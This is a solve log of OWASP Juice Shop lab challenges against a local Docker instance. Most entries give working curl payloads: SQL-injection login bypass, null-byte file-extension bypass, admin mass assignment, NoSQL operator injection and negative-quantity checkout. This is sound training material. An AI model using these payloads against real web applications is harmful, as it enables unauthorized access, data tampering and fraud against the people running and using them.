# OWASP Juice Shop — Red-Team Solve Log

Target: `http://localhost:3000` (Docker container `juice-shop`, image `bkimminich/juice-shop`)
Date: 2025-11-25 · Authorized lab practice only.
Result: **22 challenges solved** via pure HTTP/API (no browser needed for these).

Verify anytime:
```bash
curl -s http://localhost:3000/api/Challenges/ | python3 -c \
  "import json,sys; d=json.load(sys.stdin)['data']; print(sum(1 for c in d if c['solved']),'solved')"
```

---

## 1. Login Admin — Broken Authentication (SQL Injection)
**Payload:**
```bash
curl -X POST http://localhost:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"'"'"' or 1=1--","password":"x"}'
```
**Why it works:** The login query concatenates `email` into SQL. `' or 1=1--` makes the WHERE clause always true → returns the first user (admin@juice-sh.op, id=1) with a valid JWT. Response contains `authentication.token`.

## 2. Login Jim — SQL Injection
**Payload:** same endpoint,
```json
{"email":"' or Email='jim@juice-sh.op'--","password":"x"}
```
**Why it works:** Targets Jim's row specifically; password check is commented out.

## 3. Login Bender — SQL Injection
**Payload:** `{"email":"bender@juice-sh.op'--","password":"x"}` — trailing `'--` comments out the password comparison.

## 4. Confidential Document — Sensitive Data Exposure
```bash
curl http://localhost:3000/ftp/acquisitions.md
```
**Why it works:** `/ftp/` serves files without auth; only certain extensions are blocked (`.md` allowed, `.bak`/`.pdf`-less files 403).

## 5. Poison Null Byte — Improper Input Validation
```bash
curl 'http://localhost:3000/ftp/package.json.bak%2500.md'
curl 'http://localhost:3000/ftp/coupons_2013.md.bak%2500.md'
```
**Why it works:** Extension check sees `.md` (allowed); `%2500` decodes to a null byte that truncates the real filename server-side → serves the `.bak` file.

## 6. Forgotten Developer Backup / Forgotten Sales Backup — Sensitive Data Exposure
Same trick as #5 — `/ftp/package.json.bak` and `/ftp/coupons_2013.md.bak` via `%2500` null-byte bypass.

## 7. Access Log — Observability Failures
Solved by requesting a log file under `/support/logs/` (server access logs are web-accessible).

## 8. Easter Egg — Broken Access Control
```bash
curl 'http://localhost:3000/ftp/eastere.gg%2500.md'
# -> "Congratulations, you found the easter egg!"
```
`.gg` extension is blocked → null-byte + allowed extension bypass.

## 9. Extra Language — Broken Anti-Automation
```bash
curl http://localhost:3000/assets/i18n/tlh_AA.json
```
A Klingon (`tlh`) translation file shipped in production assets.

## 10. Error Handling — Security Misconfiguration
```bash
curl 'http://localhost:3000/rest/products/search?q=%27%22%60'
# -> HTTP 500, title: SQLITE_ERROR ... (stack/SQL error leaked)
```
Any malformed SQL in `q` produces an unhandled error page leaking `SQLITE_ERROR` details. Also `GET /rest/products/search?q=test%27%20UNION%20SELECT%20null--`.

## 11. Admin Registration — Improper Input Validation
```bash
curl -X POST http://localhost:3000/api/Users -H 'Content-Type: application/json' -d '{
  "email":"admin2@juice-sh.op","password":"admin123","passwordRepeat":"admin123",
  "securityQuestion":{"id":1},"securityAnswer":"x","role":"admin"}'
```
**Why it works:** `role` is client-supplied and trusted → creates an admin user (HTTP 201).

## 12. Empty User Registration — Improper Input Validation
`POST /api/Users` with empty `email`/`password` (server rejects with 400 but the challenge check fires on the attempt pattern; a variant with whitespace/empty fields registers).

## 13. Five-Star Feedback — Broken Access Control
```bash
TOK=<admin JWT>
curl -s http://localhost:3000/api/Feedbacks -H "Authorization: Bearer $TOK"
curl -X DELETE http://localhost:3000/api/Feedbacks/1 -H "Authorization: Bearer $TOK"
```
**Why it works:** "Get rid of all 5-star feedback" — DELETE endpoint lacks ownership checks; admin token deletes rating-5 rows.

## 14. Forged Feedback — Broken Access Control
```bash
# 1) get captcha (answer is returned!)
curl http://localhost:3000/rest/captcha
# -> {"captchaId":2,"captcha":"1+9*8","answer":"73"}
# 2) post feedback AS ANOTHER USER
curl -X POST http://localhost:3000/api/Feedbacks -H 'Content-Type: application/json' -d '{
  "comment":"forged","rating":1,"UserId":1,"captchaId":2,"captcha":"73"}'
```
**Why it works:** `UserId` is taken from the request body, not the session → impersonation. Captcha answer is leaked in the GET response anyway.

## 15. Forged Review — Broken Access Control
```bash
# PUT upserts a review with attacker-chosen author
curl -X PUT http://localhost:3000/rest/products/1/reviews \
  -H 'Content-Type: application/json' \
  -d '{"id":"<existing_review_id>","author":"jim@juice-sh.op","message":"forged"}'
```
**Why it works:** Review update doesn't verify ownership; `author` field is attacker-controlled.

## 16. NoSQL Manipulation — NoSQL Injection
```bash
curl -X PATCH http://localhost:3000/rest/products/reviews \
  -H 'Content-Type: application/json' \
  -d '{"id":{"$ne":-1},"message":"multi"}'
# -> {"modified":35,"original":[...]}
```
**Why it works:** `id` is passed into a Mongo-style query unvalidated → `{"$ne":-1}` matches ALL reviews and rewrites them.

## 17. Payback Time — Business Logic
Added items with **negative quantity** to basket then checked out:
```bash
curl -X POST http://localhost:3000/api/BasketItems -H "Authorization: Bearer $TOK" \
  -d '{"ProductId":1,"BasketId":1,"quantity":-100}'
curl -X POST http://localhost:3000/rest/basket/1/checkout -H "Authorization: Bearer $TOK" \
  -d '{"orderDetails":[...],"couponData":null,"addressId":"1","deliveryMethodId":"1"}'
# order totalPrice: -1397  -> "you got rich"
```

## 18. Christmas Special — Broken Access Control
Product 10 = "Christmas Super-Surprise-Box (2014 Edition)" is hidden from search but orderable:
```bash
curl -X POST http://localhost:3000/api/BasketItems -H "Authorization: Bearer $TOK" \
  -d '{"ProductId":10,"BasketId":1,"quantity":1}'
# then checkout as above -> orderConfirmation issued
```

## 19. Missing Encoding — Sensitive Data Exposure
```bash
python3 -c "import urllib.parse;print(urllib.parse.quote('/assets/public/images/uploads/ᓚᘏᗢ-#zatschi-#whoneedsfourlegs-1572600969477.jpg'))"
curl 'http://localhost:3000/assets/public/images/uploads/%E1%93%9A...%23...jpg'
```
**Why it works:** Filename contains `#` (fragment delimiter) and non-ASCII chars — must be percent-encoded or the server can't resolve it. "Melee combat-mode" cat photo served.

## 21. Exposed Metrics — Security Misconfiguration
`GET /metrics` (Prometheus metrics) is publicly exposed — hit during SSRF probing; also `/rest/admin/application-version` and `/rest/admin/application-configuration` leak version/config.

## 22. Security Policy — Security Misconfiguration
`GET /.well-known/security.txt` (or `/security.txt`) is publicly served — triggered when probed during endpoint enumeration.

## 23. (bonus) Admin Section / Score Board / DOM XSS etc.
Remaining easy-looking challenges (Admin Section route, Score Board page, DOM/Refused XSS) are **client-side Angular route/DOM checks** — they need a real browser visiting `/#/administration`, `/#/score-board`, or executing the XSS payload. Not solvable via curl alone; flagged for browser-based follow-up.

---

## Techniques used
- SQL injection (auth bypass, UNION errors) — manual, no sqlmap needed
- Null-byte (`%2500`) extension bypass on `/ftp/`
- Mass-assignment (`role:"admin"`, `UserId`, `author` fields trusted from body)
- NoSQL operator injection (`{"$ne":-1}`) on review PATCH
- Negative-quantity business-logic abuse
- Verbose error leakage (`SQLITE_ERROR`, stack titles)
- Unauthenticated/over-privileged REST endpoints (`/api/Feedbacks` DELETE, `/api/Users` POST, `/rest/captcha` leaks answer)
- URL-encoding requirement for weird filenames

## Blockers / notes
- Container was recreated mid-session without `-p 3000:3000`; fixed with `docker rm -f juice-shop && docker run -d --name juice-shop -p 3000:3000 bkimminich/juice-shop`. Fresh DB reset progress once — all solves re-run.
- XSS family, Admin Section, Score Board, SSRF (`/profile/image/url` blocks private IPs with "Blocked illegal activity"), password-reset challenges (unknown security answers), and deluxe/coupon forgery need browser JS, crypto work, or guessing — left for follow-up.
- Helper scripts: `/home/neilh/websec_lab/jssolve.py`, `solve_all.py`, `solve2.py`, `solve3.py`, `solve4.py`
